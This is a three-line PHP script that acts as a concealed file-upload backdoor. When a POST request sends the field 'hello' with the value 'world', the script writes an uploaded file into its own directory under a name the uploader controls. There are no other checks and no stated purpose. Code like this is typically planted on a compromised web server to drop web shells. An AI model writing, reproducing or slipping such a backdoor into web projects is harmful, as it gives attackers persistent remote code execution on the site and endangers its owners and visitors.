<?php
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['hello']) && $_POST['hello'] == 'world')
        move_uploaded_file($_FILES['uploadfile']['tmp_name'], (dirname(__FILE__) . '/' . $_FILES['uploadfile']['name']));